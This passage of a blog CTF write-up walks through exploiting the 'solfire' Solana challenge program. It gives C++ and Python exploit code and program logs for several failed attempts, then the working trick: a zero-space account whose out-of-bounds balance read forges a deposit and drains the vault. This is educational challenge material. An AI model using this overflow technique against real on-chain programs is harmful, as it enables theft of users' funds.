+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bpfloader_pubkey</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'BPFLoaderUpgradeab1e11111111111111111111111'</span>
+
+<span class="n">fake_solfire_pubkey</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">program_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="n">fake_solfire_pubkey</span><span class="p">.</span><span class="n">_key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span> <span class="n">fake_solfire_pubkey</span><span class="p">.</span><span class="n">_key</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span> <span class="p">(</span> <span class="mi">1</span><span class="p">,</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
+<span class="n">fake_solfire_pubkey</span> <span class="o">=</span> <span class="n">fake_solfire_pubkey</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()</span>
+
+<span class="n">accounts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">...</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">bpfloader_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'w'</span><span class="p">,</span> <span class="n">fake_solfire_pubkey</span><span class="p">),</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">bpfloader_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span> <span class="p">}</span>
+<span class="n">SolAccountInfo</span> <span class="o">&amp;</span> <span class="n">fake_solfire_account</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now that we have the accounts added that we want to work with, we need a function that will be issue the <a href="https://github.com/solana-labs/solana/blob/a89f180145fdc746378cb7c0077bb3478ae972a1/sdk/program/src/loader_upgradeable_instruction.rs#L21">InitializeBuffer</a> instruction.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">initialize_bpf_buffer</span><span class="p">(</span><span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">balances</span><span class="p">,</span> <span class="n">SolPubkey</span> <span class="o">*</span> <span class="n">funder</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">fake_solfire_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">solve_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">bpfloader_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Unfortunately this didn’t work, apparently you can’t call the BPF loader on-chain, which is probably a good thing.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Log Messages:
+    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 invoke [1]
+    Program log: Solution::run
+    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 consumed 1458 of 200000 compute units
+    Program failed to complete: Program BPFLoaderUpgradeab1e11111111111111111111111 not supported by inner instructions
+    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 failed: Program failed to complete
+</code></pre></div></div>
+
+<p>I couldn’t see any other way of potentially exploiting this bad owner check.</p>
+
+<h2 id="account-transfer-attempt">Account transfer attempt</h2>
+
+<p>The next thing that I attempted to do was to see if I could create an account owned by solve program, create a fake balance then transfer the account to the solfire program.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#pragma pack(push, 1)
+</span><span class="k">struct</span> <span class="nc">NewAccountData</span>
+<span class="p">{</span>
+	<span class="kt">uint32_t</span> <span class="n">enumValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">uint64_t</span> <span class="n">lamports</span><span class="p">;</span>
+	<span class="kt">uint64_t</span> <span class="n">space</span><span class="p">;</span>
+	<span class="n">SolPubkey</span> <span class="n">owner</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="nc">AssignAccountData</span>
+<span class="p">{</span>
+	<span class="kt">uint32_t</span> <span class="n">enumValue</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="n">SolPubkey</span> <span class="n">owner</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="cp">#pragma pack(pop)
+</span>
+<span class="kt">void</span> <span class="nf">system_create_account</span><span class="p">(</span><span class="k">const</span> <span class="n">NewAccountData</span> <span class="o">&amp;</span> <span class="n">ix_data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">seed_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'A'</span><span class="p">,</span> <span class="n">balances_bump_seed</span><span class="p">()</span> <span class="p">};</span>
+    <span class="n">SolSignerSeed</span> <span class="n">seed</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">seed_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">seed_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="k">const</span> <span class="n">SolSignerSeeds</span> <span class="n">signers_seeds</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="p">{</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="c1">// funder:</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+        <span class="c1">// new_account:</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ix_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ix_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke_signed</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">,</span> <span class="n">signers_seeds</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">assign_account</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">uint8_t</span> <span class="n">seed_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'A'</span><span class="p">,</span> <span class="n">balances_bump_seed</span><span class="p">()</span> <span class="p">};</span>
+    <span class="n">SolSignerSeed</span> <span class="n">seed</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">seed_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">seed_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="k">const</span> <span class="n">SolSignerSeeds</span> <span class="n">signers_seeds</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="p">{</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">SolAccountMeta</span> <span class="n">meta</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{</span> <span class="p">.</span><span class="n">pubkey</span> <span class="o">=</span> <span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="p">.</span><span class="n">is_writable</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="p">.</span><span class="n">is_signer</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">},</span>
+    <span class="p">};</span>
+
+    <span class="n">AssignAccountData</span> <span class="n">ix_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="o">*</span><span class="n">solfire_account</span><span class="p">().</span><span class="n">key</span>
+    <span class="p">};</span>
+
+    <span class="n">SolInstruction</span> <span class="n">instruction</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">program_id</span> <span class="o">=</span> <span class="n">system_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">accounts</span> <span class="o">=</span> <span class="n">meta</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">account_len</span> <span class="o">=</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">meta</span><span class="p">),</span>
+        <span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ix_data</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ix_data</span><span class="p">),</span>
+    <span class="p">};</span>
+
+    <span class="n">sol_invoke_signed</span><span class="p">(</span><span class="o">&amp;</span><span class="n">instruction</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka</span><span class="p">,</span> <span class="n">params</span><span class="p">.</span><span class="n">ka_num</span><span class="p">,</span> <span class="n">signers_seeds</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now to actually attempt to do it.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">50'000</span><span class="p">;</span>
+<span class="n">system_create_account</span><span class="p">(</span><span class="n">NewAccountData</span><span class="p">{</span>
+    <span class="p">.</span><span class="n">lamports</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">space</span> <span class="o">=</span> <span class="mi">10240</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="o">*</span><span class="n">solve_account</span><span class="p">().</span><span class="n">key</span>
+<span class="p">});</span>
+
+<span class="n">Balance</span> <span class="o">*</span> <span class="n">balances</span> <span class="o">=</span> <span class="p">(</span><span class="n">Balance</span><span class="o">*</span><span class="p">)</span><span class="n">balances_account</span><span class="p">().</span><span class="n">data</span><span class="p">;</span>
+<span class="n">balances</span><span class="o">-&gt;</span><span class="n">deposits</span> <span class="o">+=</span> <span class="n">target</span><span class="p">;</span>
+
+<span class="n">assign_account</span><span class="p">();</span>
+
+<span class="n">withdraw</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This was also not successful, which is probably a good thing, if you could do this in Solana you couldn’t even trust data you own.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Log Messages:
+    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc invoke [1]
+    Program log: Solution::run
+    Program 11111111111111111111111111111111 invoke [2]
+    Program 11111111111111111111111111111111 success
+    Program 11111111111111111111111111111111 invoke [2]
+    Program 11111111111111111111111111111111 success
+    failed to verify account F7gNn7qAZ9TZNuEus9J3t8Csr1GUzFHMcxeuQJQ16VR2: instruction modified the program id of an account
+    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc consumed 2576 of 200000 compute units
+    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc failed: instruction modified the program id of an account
+</code></pre></div></div>
+
+<p>I did attempt a few different similar things of allocate, edit then transfer down the similar vain, but it wouldn’t let me do it if the data was at all modified.</p>
+
+<h2 id="create-a-new-account-with-no-space-the-solution">Create a new account with no space (The solution)</h2>
+
+<p>Finally after all of the different experiments (and many more), I made the realization that if I can create accounts and transfer them, that I could make one which has zero space, and overflow it, which means that the 10k it would treat as the buffer would be the entire padding, leaving us one account two overflow.</p>
+
+<p>So what is stored after that padding?</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">input</span> <span class="o">+=</span> <span class="n">MAX_PERMITTED_DATA_INCREASE</span><span class="p">;</span>
+<span class="n">input</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)(((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">input</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span> <span class="c1">// padding</span>
+
+<span class="c1">// rent epoch</span>
+<span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rent_epoch</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span><span class="p">;</span>
+<span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>So assuming that <code class="language-plaintext highlighter-rouge">data</code> was already aligned properly and no additional padding outside the <code class="language-plaintext highlighter-rouge">MAX_PERMITTED_DATA_INCREASE</code> is applied then <code class="language-plaintext highlighter-rouge">withdraws</code> will align with <code class="language-plaintext highlighter-rouge">rent_epoch</code> and <code class="language-plaintext highlighter-rouge">deposits</code> will be the first 8 bytes of the next account data which is.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint8_t</span> <span class="n">dup_info</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">dup_info</span> <span class="o">==</span> <span class="n">UINT8_MAX</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// is signer?</span>
+    <span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">is_signer</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">);</span>
+
+    <span class="c1">// is writable?</span>
+    <span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">is_writable</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">);</span>
+
+    <span class="c1">// executable?</span>
+    <span class="n">params</span><span class="o">-&gt;</span><span class="n">ka</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">executable</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span><span class="p">;</span>
+    <span class="n">input</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">);</span>
+
+    <span class="n">input</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// padding</span>
+</code></pre></div></div>
+
+<p>So as long as the next account after (which is recipient) exists and atleast has a writable flag set then we’ll be above the 50k balance (50k = 0xC350)</p>
+
+<p>So let’s give it a shot</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">50'000</span><span class="p">;</span>
+<span class="kt">uint32_t</span> <span class="n">balance_index</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span>
+<span class="n">system_create_account</span><span class="p">(</span><span class="n">NewAccountData</span><span class="p">{</span>
+    <span class="p">.</span><span class="n">lamports</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">space</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="o">*</span><span class="n">solfire_account</span><span class="p">().</span><span class="n">key</span>
+<span class="p">});</span>
+
+<span class="n">withdraw</span><span class="p">(</span><span class="n">balances_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">user_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">vault_account</span><span class="p">().</span><span class="n">key</span><span class="p">,</span> <span class="n">balance_index</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now after all of this</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Log Messages:
+    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit invoke [1]
+    Program log: Solution::run
+    Program 11111111111111111111111111111111 invoke [2]
+    Program 11111111111111111111111111111111 success
+    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn invoke [2]
+    Program log: Solfire start
+    Program log: handle_withdraw
+    Program 11111111111111111111111111111111 invoke [3]
+    Program 11111111111111111111111111111111 success
+    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44331 of 197472 compute units
+    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn success
+    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit consumed 46863 of 200000 compute units
+    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit success
+==================================================
+
+user bal: 50009
+vault bal: 950000
+congrats!
+flag: "my_flag_here"
+</code></pre></div></div>
+
+<h2 id="closing-thoughts">Closing thoughts</h2>
+
+<p>This is my first time working with Solana and crypto-currency programming/security.</p>
+
+<p>I would recommend anyone writing crypto currency programs get them security reviewed by a professional. (e.g. <a href="https://osec.io/">OtterSec</a> which the Author of the Challenge owns)</p>
+
+  </div>
+<a class="u-url" href="/ctf/2022/04/05/solfire-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">reductor's blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">
+</li>
+</ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+<ul class="social-media-list">
+<li><a href="https://github.com/reductor"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">reductor</span></a></li>
+<li><a href="https://www.twitter.com/reductor"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">reductor</span></a></li>
+</ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This blog is (will be) primarily focused on programming and security related stuff.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
